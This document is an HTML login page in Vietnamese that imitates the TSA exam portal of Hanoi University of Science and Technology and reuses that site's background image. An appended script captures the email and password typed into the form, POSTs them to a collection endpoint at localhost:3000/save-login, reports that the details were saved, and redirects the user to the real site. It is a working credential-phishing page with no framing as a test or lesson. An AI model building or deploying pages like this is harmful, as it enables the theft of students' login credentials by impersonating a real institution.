<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập - TSA</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background: url('https://tsa.hust.edu.vn/static/media/bg-page-login.c1e278a5.png') no-repeat center center fixed;
            background-size: cover;
        }
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 30px;
            background: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .btn-login {
            background-color: #d00;
            color: white;
        }
        .btn-login:hover {
            background-color: #a00;
        }
        .forgot-password {
            color: #d00;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-container">
            <h2>Đăng nhập</h2>
            <p>Ban chưa có tài khoản? <a href="#" style="color: #d00;">Đăng ký ngay</a></p>
            <form id="login-form">
                <div class="mb-3 text-start">
                    <label class="form-label">Email *</label>
                    <input type="email" class="form-control" placeholder="Nhập email" required>
                </div>
                <div class="mb-3 text-start">
                    <label class="form-label">Mật khẩu *</label>
                    <input type="password" class="form-control" placeholder="Nhập mật khẩu" required>
                </div>
                <button type="submit" class="btn btn-login w-100">Đăng nhập</button>
            </form>
            <a href="#" class="forgot-password mt-3 d-block">Quên mật khẩu?</a>
        </div>
    </div>
</body>

<script>
    document.getElementById("login-form").addEventListener("submit", function(event) {
        event.preventDefault(); // Ngăn chặn gửi biểu mẫu mặc định
        window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Chuyển hướng đến trang lỗi không tồn tại
    });
</script>
</html>


<script>
    document.getElementById("login-form").addEventListener("submit", function(event) {
        event.preventDefault(); // Ngăn chặn reload trang
        
        const email = document.querySelector("input[type='email']").value;
        const password = document.querySelector("input[type='password']").value;
        
        fetch("http://localhost:3000/save-login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password })
        }).then(response => response.json())
        .then(data => {
            alert("Thông tin đăng nhập đã được lưu!");
            window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Điều hướng sau khi gửi
        });
    });
    </script>
